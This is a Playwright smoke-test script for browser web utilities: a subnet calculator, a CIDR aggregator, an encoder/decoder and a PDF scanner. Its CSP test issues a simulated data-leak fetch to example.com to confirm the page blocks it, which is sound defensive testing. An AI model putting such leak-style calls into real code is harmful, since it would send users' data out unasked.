# /// script
# requires-python = ">=3.10"
# dependencies = ["playwright>=1.48"]
# ///
"""Browser smoke and regression tests for the webutils.

Run with:  uv run tests/smoke_test.py
First time: uv run --with playwright playwright install chromium

Serves the repository root over HTTP on a random port and drives each tool
in headless Chromium. The tools load their libraries from public CDNs, so
the tests need network access.
"""

import functools
import http.server
import sys
import threading
import traceback
from pathlib import Path

from playwright.sync_api import Page, expect, sync_playwright

ROOT = Path(__file__).resolve().parent.parent
TESTS = []


def test(fn):
    TESTS.append(fn)
    return fn


def serve():
    class Quiet(http.server.SimpleHTTPRequestHandler):
        def log_message(self, *args):
            pass

    handler = functools.partial(Quiet, directory=str(ROOT))
    httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd, f"http://127.0.0.1:{httpd.server_address[1]}"


class Ctx:
    def __init__(self, browser, base):
        self.browser = browser
        self.base = base

    def page(self, path, storage=None):
        """Open a fresh context; fail the test on any page error or console error."""
        context = self.browser.new_context(permissions=["clipboard-read", "clipboard-write"])
        if storage:
            script = "".join(f"localStorage.setItem({k!r}, {v!r});" for k, v in storage.items())
            context.add_init_script(f"if (!sessionStorage.getItem('__seeded')) {{ {script} sessionStorage.setItem('__seeded', '1'); }}")
        page = context.new_page()
        page.errors = []
        page.on("pageerror", lambda e: page.errors.append(f"pageerror: {e}"))
        page.on("console", lambda m: m.type == "error" and page.errors.append(f"console.error: {m.text}"))
        page.goto(path if "://" in path else self.base + path)
        return page


def no_errors(page: Page):
    assert not page.errors, "\n".join(page.errors)


# --- every tool loads cleanly -------------------------------------------------

@test
def all_pages_load(c: Ctx):
    for path, marker in [
        ("/index.html", "Subnet Calculator"),
        ("/webutils/subnet-calculator.html", "Subnet Address"),
        ("/webutils/cidr-aggregator.html", "Input CIDRs"),
        ("/webutils/encoder-decoder.html", "Format"),
        ("/webutils/pdf-scanner.html", "Upload PDF"),
    ]:
        page = c.page(path)
        expect(page.get_by_text(marker).first).to_be_visible(timeout=20000)
        no_errors(page)
        page.context.close()


@test
def pages_work_from_file_urls(c: Ctx):
    """README promise: double-click any .html file, no server needed."""
    for name, marker in [
        ("subnet-calculator.html", "Subnet Address"),
        ("cidr-aggregator.html", "Input CIDRs"),
        ("encoder-decoder.html", "Format"),
        ("pdf-scanner.html", "Upload PDF"),
    ]:
        page = c.page((ROOT / "webutils" / name).as_uri())
        expect(page.get_by_text(marker).first).to_be_visible(timeout=20000)
        no_errors(page)
        page.context.close()


@test
def csp_blocks_network(c: Ctx):
    """The CSP must stop a compromised dependency from sending data anywhere."""
    for name in ["subnet-calculator.html", "cidr-aggregator.html", "encoder-decoder.html", "pdf-scanner.html"]:
        page = c.page(f"/webutils/{name}")
        page.wait_for_load_state("networkidle")
        outcome = page.evaluate("""async () => {
            try { await fetch('https://example.com/?leak=1', {mode: 'no-cors'}); return 'sent'; }
            catch (e) { return 'blocked'; }
        }""")
        assert outcome == "blocked", f"{name}: fetch was not blocked"
        page.context.close()


# --- subnet calculator --------------------------------------------------------

@test
def subnet_divide_and_join(c: Ctx):
    page = c.page("/webutils/subnet-calculator.html")
    page.get_by_role("textbox").first.fill("192.168.0.0")
    page.locator("input[type=number]").first.fill("24")
    page.get_by_role("button", name="Update").click()
    expect(page.get_by_text("192.168.0.0", exact=True).first).to_be_visible()
    page.get_by_title("Split into two smaller subnets").first.click()
    expect(page.get_by_title("Split into two smaller subnets")).to_have_count(2)
    expect(page.get_by_text("192.168.0.128", exact=True)).to_be_visible()
    page.get_by_title("Join subnets back to /24").click()
    expect(page.get_by_title("Split into two smaller subnets")).to_have_count(1)
    no_errors(page)


# --- CIDR aggregator ----------------------------------------------------------

@test
def aggregator_merges(c: Ctx):
    page = c.page("/webutils/cidr-aggregator.html")
    page.locator("textarea").fill("192.168.0.0/24\n192.168.1.0/24\n10.0.0.5\n10.0.0.4")
    results = page.locator("a[title='Visualize in Subnet Calculator']")
    expect(results).to_have_text(["10.0.0.4/31", "192.168.0.0/23"])
    no_errors(page)


# --- encoder / decoder --------------------------------------------------------

def codec_output(page: Page):
    return page.get_by_test_id("output")


@test
def codec_base64_roundtrip(c: Ctx):
    page = c.page("/webutils/encoder-decoder.html")
    page.locator("textarea").first.fill("hello world")
    page.locator("select").select_option("Base64")
    expect(codec_output(page)).to_have_text("aGVsbG8gd29ybGQ=")
    no_errors(page)


# --- PDF scanner -------------------------------------------------------------

def make_pdf(pages):
    """Minimal vector-only PDF; pages is a list of (width_pt, height_pt)."""
    objs = ["<< /Type /Catalog /Pages 2 0 R >>", None]
    kids = []
    for w, h in pages:
        content = f"0 0 0 rg 36 36 {w - 72} 20 re f 0.5 g 36 {h - 120} {w / 2} 60 re f".encode()
        objs.append(f"<< /Length {len(content)} >>\nstream\n{content.decode()}\nendstream")
        objs.append(f"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 {w} {h}] /Contents {len(objs)} 0 R /Resources << >> >>")
        kids.append(f"{len(objs)} 0 R")
    objs[1] = f"<< /Type /Pages /Kids [{' '.join(kids)}] /Count {len(pages)} >>"
    out, offsets = b"%PDF-1.4\n", []
    for i, body in enumerate(objs, 1):
        offsets.append(len(out))
        out += f"{i} 0 obj\n{body}\nendobj\n".encode()
    xref = len(out)
    out += f"xref\n0 {len(objs) + 1}\n0000000000 65535 f \n".encode()
    out += "".join(f"{o:010d} 00000 n \n" for o in offsets).encode()
    out += f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
    return out


def load_pdf(page: Page, pages):
    page.locator("#fileInput").set_input_files(
        files=[{"name": "t.pdf", "mimeType": "application/pdf", "buffer": make_pdf(pages)}])
    expect(page.locator("#pageCountBadge")).to_have_text(f"{len(pages)} Pages", timeout=20000)


def export_pdf(page: Page) -> bytes:
    with page.expect_download(timeout=60000) as dl:
        page.locator("#downloadBtn").click()
    return Path(dl.value.path()).read_bytes()


@test
def scanner_loads_and_exports(c: Ctx):
    page = c.page("/webutils/pdf-scanner.html")
    load_pdf(page, [(595, 842), (842, 595)])
    expect(page.locator("#previewWrapper canvas")).to_have_count(1)
    data = export_pdf(page)
    assert data.startswith(b"%PDF"), data[:20]
    no_errors(page)


# --- runner -------------------------------------------------------------------

def main(selected):
    httpd, base = serve()
    failed = 0
    with sync_playwright() as p:
        browser = p.chromium.launch()
        c = Ctx(browser, base)
        for fn in TESTS:
            if selected and fn.__name__ not in selected:
                continue
            try:
                fn(c)
                print(f"ok   {fn.__name__}")
            except Exception:
                failed += 1
                print(f"FAIL {fn.__name__}")
                traceback.print_exc()
        browser.close()
    httpd.shutdown()
    print(f"\n{len(TESTS) - failed if not selected else '-'} passed, {failed} failed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
